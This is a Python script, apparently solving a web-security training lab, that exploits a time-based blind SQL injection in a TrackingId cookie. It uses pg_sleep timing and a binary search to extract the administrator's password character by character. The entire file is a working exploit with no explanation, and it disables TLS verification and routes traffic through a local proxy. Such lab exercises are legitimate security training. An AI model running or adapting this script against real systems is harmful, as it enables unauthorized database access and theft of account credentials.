import requests
import urllib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}


URL= 'https://0a8900b5042bf904c34924e900fa00c3.web-security-academy.net/'

def blindsql(url):
    password = ''
    for i in range(1,21):
        lo = 32
        hi = 128
        while(lo <= hi):
            mid = lo + (hi - lo) // 2
            sql_payload = "'|| (SELECT CASE WHEN (ascii(substr(password,%s,1)) > %s) THEN pg_sleep(2) ELSE pg_sleep(-1) END FROM users WHERE username = 'administrator')--" % (i,mid)
            sql_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {'TrackingId' : 'zfyR4X9wCGV5irh7' + sql_payload_encoded, 'session' : 'uukiIUKbEzkJ4MJv0NwXD6jdWg2mVwRZ'}
            r = requests.get(url=url, cookies=cookies, verify=False, proxies=proxies)
            if int(r.elapsed.total_seconds()) > 1 :
                lo = mid + 1
            else:
                hi = mid - 1
                print("Not " + chr(lo) + " Retrying another character...")
        password += chr(lo)
        print("Found " + " character " + str(i) + "! :" + chr(lo))
    print("Password for administrator is : " + password)


blindsql(URL)